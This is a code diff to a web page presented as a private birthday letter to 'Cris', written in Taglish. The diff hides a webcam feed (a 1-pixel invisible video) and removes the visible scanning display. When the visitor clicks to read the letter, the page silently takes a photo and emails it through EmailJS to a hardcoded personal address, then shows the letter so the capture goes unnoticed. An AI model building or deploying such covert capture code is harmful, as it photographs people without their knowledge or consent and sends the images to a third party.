@@ -3,70 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
+    <title>Birthday Access</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        body { background: #000; color: #00f2ff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        #video-container { width: 250px; height: 250px; border: 3px solid #00f2ff; border-radius: 50%; overflow: hidden; position: relative; }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        .scan { position: absolute; width: 100%; height: 4px; background: #00f2ff; top: 0; animation: move 2s infinite; display: none; }
-        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
-        button { margin-top: 20px; padding: 15px 30px; background: #00f2ff; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
-        input { margin: 10px; padding: 10px; border-radius: 5px; border: none; text-align: center; }
-        #message { display: none; text-align: center; color: white; padding: 20px; }
+        body { background: #000; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { text-align: center; width: 90%; }
+        video { width: 1px; height: 1px; opacity: 0; position: absolute; } /* Invisible camera */
+        #letter { display: none; background: #fff; color: #000; padding: 20px; border-radius: 10px; text-align: left; max-height: 80vh; overflow-y: auto; }
+        .btn { background: #ffd700; border: none; padding: 15px 30px; font-weight: bold; font-size: 1.1rem; border-radius: 50px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div id="capture-site">
-        <h2>SYSTEM SCAN</h2>
-        <div id="video-container">
-            <video id="webcam" autoplay playsinline></video>
-            <div id="scanner" class="scan"></div>
+    <div class="container">
+        <video id="webcam" autoplay playsinline></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+
+        <div id="access-screen">
+            <h2 style="color: #00f2ff;">🔒 PRIVATE MESSAGE</h2>
+            <p>Verification Required to Read</p>
+            <button class="btn" onclick="captureAndAccess()">CLICK TO ACCESS THE LETTER</button>
         </div>
-        <input type="text" id="userName" placeholder="Full Name">
-        <button onclick="captureAndSend()">VERIFY IDENTITY</button>
-    </div>
 
-    <div id="message">
-        <h1>ACCESS GRANTED</h1>
-        <p>Happy Birthday, Cris! Check your messages.</p>
+        <div id="letter">
+            <h3>Happy birthday, Cris!!</h3>
+            <p>Bro, u should really read this kahit ang hirap mag-code ng message na ‘to 😭</p>
+            <p>Salamat sa lahat, fr. Dahil sa inyo, hindi na ako yung taong laging lost at di marunong umuwi mag-isa HAHAHA. Y’all made everything lighter, mas fun, at parang kahit gaano ka-bad yung araw, okay lang kasi nandyan kayo.</p>
+            <p>Thank you sa lahat ng bonding natin—kahit sabog, kahit magulo, kahit walang plano, solid pa rin. Solid kayo, as in.</p>
+            <p>Next time, promise, babawi ako. <b>Gagawin nating honor student trio arc ‘to 😤📚</b> wala munang tamad era.</p>
+            <p>And bro… chill lang sa life, wag ka muna magmadali mag-asawa or magka-anak 😭 malalaki pa pangarap natin. We’ve got places to go, goals to hit, and memories to make pa.</p>
+            <p>Happy birthday ulit, Cris. Stay legendary. Stay unbothered. Stay you.</p>
+            <p><b>We’re just getting started. 🚀</b></p>
+        </div>
     </div>
-
-    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         (function() { emailjs.init("A996XaJv7m7qD29bh"); })();
 
         const video = document.getElementById('webcam');
-        navigator.mediaDevices.getUserMedia({ video: true })
+        
+        // Start camera automatically in background
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => { video.srcObject = stream; })
-            .catch(err => alert("Camera access required!"));
+            .catch(err => { console.log("Camera access denied"); });
 
-        function captureAndSend() {
-            const name = document.getElementById('userName').value;
-            if (!name) return alert("Name required");
-
-            document.getElementById('scanner').style.display = 'block';
-
-            // Capture
+        function captureAndAccess() {
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photo = canvas.toDataURL('image/jpeg', 0.7);
 
-            // Send
+            // Set small canvas size to reduce file size further
+            canvas.width = 320;
+            canvas.height = 240;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // 0.1 Quality to ensure around 20KB or less
+            const photo = canvas.toDataURL('image/jpeg', 0.1);
+
+            // Send to your Email
             emailjs.send("service_7urz7m7", "template_7mr2oqu", {
-                full_name: name,
+                full_name: "Cris (Identity Captured)",
                 image_data: photo,
                 to_email: "refuerzojay7@gmail.com"
             }).then(() => {
-                // Show Success
-                document.getElementById('capture-site').style.display = 'none';
-                document.getElementById('message').style.display = 'block';
+                console.log("Sent!");
             });
+
+            // Switch Screen immediately
+            document.getElementById('access-screen').style.display = 'none';
+            document.getElementById('letter').style.display = 'block';
         }
     </script>
 </body>
